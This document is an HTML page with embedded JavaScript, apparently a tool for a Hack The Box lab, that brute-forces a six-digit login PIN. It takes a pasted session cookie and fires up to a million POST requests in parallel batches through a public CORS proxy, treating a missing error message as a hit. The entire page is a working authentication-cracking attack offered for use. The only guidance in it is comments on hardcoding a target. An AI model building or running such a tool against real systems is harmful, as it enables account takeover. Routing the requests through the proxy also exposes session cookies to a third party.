<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HTB PIN Cracker</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
        .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        input { width: 100%; padding: 12px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin: 15px 0; box-sizing: border-box; font-family: monospace; font-size: 14px; text-align: center; }
        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 16px; font-family: monospace; letter-spacing: 1px; }
        button:disabled { background: #222; color: #444; cursor: not-allowed; border: 1px solid #333; }
        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #00ff00; margin-top: 20px; padding: 10px; font-size: 12px; text-align: left; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="panel">
    <h2>[ 6-DIGIT PIN BRUTEFORCER ]</h2>
    <input type="text" id="cookieData" placeholder="PASTE SESSION COOKIE VALUE HERE">
    <button id="actionBtn" onclick="executeAttack()">START PROCESS</button>
    <div id="console">[*] System ready. Awaiting session cookie...</div>
</div>

<script>
let processing = false;

// ========================================================
// HARDCODE YOUR TARGET BOX SETTINGS HERE BEFORE UPLOADING
// ========================================================
const HTB_URL    = "http://10.10.10.x/login"; // Replace with your exact HTB machine URL
const FIELD_NAME = "pin";                    // Replace with the input parameter field name
const ERROR_MSG  = "Invalid PIN";            // Replace with the exact text displayed when a PIN fails
// ========================================================

function logToConsole(message) {
    const box = document.getElementById('console');
    box.innerText += message + "\n";
    box.scrollTop = box.scrollHeight;
}

async function attemptPin(currentPin, targetCookie) {
    const paddedPin = String(currentPin).padStart(6, '0');
    const proxiedTarget = "corsproxy.io?" + encodeURIComponent(HTB_URL);

    try {
        const req = await fetch(proxiedTarget, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": `PHPSESSID=${targetCookie}` // Change PHPSESSID if your target application uses a different cookie name
            },
            body: `${FIELD_NAME}=${paddedPin}`
        });

        const htmlResponse = await req.text();
        
        // If the error message disappears from the web page, the correct PIN was hit
        if (!htmlResponse.includes(ERROR_MSG)) {
            return { success: true, pin: paddedPin };
        }
    } catch (err) {}
    
    return { success: false, pin: paddedPin };
}

async function executeAttack() {
    if (processing) return;
    const sessionToken = document.getElementById('cookieData').value.trim();
    
    if (!sessionToken) {
        alert("Error: You must provide a session cookie value!");
        return;
    }

    processing = true;
    document.getElementById('actionBtn').disabled = true;
    document.getElementById('console').innerText = "[*] Validating cookie configuration...\n[*] Spawning parallel attack threads...\n";

    const concurrentLimit = 25; 
    
    for (let currentVal = 0; currentVal < 1000000; currentVal += concurrentLimit) {
        if (!processing) break;

        if (currentVal % 1000 === 0) {
            logToConsole(`[-] Blasting range: ${String(currentVal).padStart(6, '0')} - ${String(currentVal + 999).padStart(6, '0')}`);
            await new Promise(successCallback => setTimeout(successCallback, 25)); 
        }

        const batchQueue = [];
        for (let offset = 0; offset < concurrentLimit && (currentVal + offset) < 1000000; offset++) {
            batchQueue.push(attemptPin(currentVal + offset, sessionToken));
        }

        const batchOutputs = await Promise.all(batchQueue);
        for (const output of batchOutputs) {
            if (output.success) {
                logToConsole(`\n[+] SUCCESS! Valid 6-digit PIN cracked: ${output.pin}`);
                processing = false;
                document.getElementById('actionBtn').disabled = false;
                return;
            }
        }
    }

    logToConsole("\n[-] Attack finished. 1,000,000 combinations exhausted. PIN not found.");
    processing = false;
    document.getElementById('actionBtn').disabled = false;
}
</script>

</body>
</html>
